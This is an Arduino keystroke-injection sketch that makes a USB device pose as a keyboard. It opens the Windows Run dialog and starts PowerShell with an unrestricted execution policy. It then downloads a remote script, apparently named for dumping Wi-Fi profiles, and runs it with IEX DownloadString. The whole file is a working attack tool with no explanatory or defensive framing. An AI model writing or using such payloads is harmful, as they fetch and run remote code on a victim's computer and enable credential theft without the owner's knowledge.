#include <Keyboard.h> 
// Init function
void setup()
{
  // Begining the stream
  Keyboard.begin();
  delay(1000);

  typeKey(KEY_LEFT_GUI);
  typeKey('r');

  delay(1000);

  Keyboard.print("powershell.exe");

  typeKey(KEY_RETURN);
  delay(2000);

  Keyboard.print("powershell.exe -executionpolicy unrestricted");

  Keyboard.print("echo IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ioChelox/publicStuffs/main/wifiGetProfiles.ps1') | powershell -noprofile ");
  typeKey(KEY_RETURN);
  delay(2000);
  Keyboard.end();

}


void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

// Unused
void loop() {}